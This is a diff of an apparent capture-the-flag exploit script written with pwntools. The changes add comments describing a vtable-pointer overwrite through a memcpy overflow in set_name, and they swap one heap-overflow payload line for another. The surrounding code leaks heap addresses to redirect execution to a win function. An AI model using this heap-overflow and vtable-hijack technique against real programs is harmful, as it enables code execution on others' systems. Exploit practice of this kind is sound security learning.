@@ -58,6 +58,10 @@ print("Win is at:", hex(win_addr))
 
 # dump leaks heap for free!
 
+# we overwrite vtable ptr of v1 to point on raw_name of v0
+# we write vtable into raw_name of v0
+# we utilize that memcpy in set_name allows overflow of raw_name to achieve this
+
 p.sendline(b"pow(1, 3)")
 p.sendlineafter(b"v0 := pow(1, 3)\n", b"dump(v0)")
 heap_leak_1 = int(p.recvline()[3:17], 16) + 8*6 # - 0x13f10
@@ -70,7 +74,7 @@ heap_leak_2 = int(p.recvline()[3:17], 16)
 print("heap leak: ", hex(heap_leak_2))
 
 
-payload = (p64(win_addr)*4).ljust(heap_leak_2-heap_leak_1, b"A") + p64(heap_leak_1)
+#payload = (p64(win_addr)*4).ljust(heap_leak_2-heap_leak_1, b"A") + p64(heap_leak_1)
 payload = b"".ljust(heap_leak_2-heap_leak_1, b"A") + p64(heap_leak_1+8)
 
 
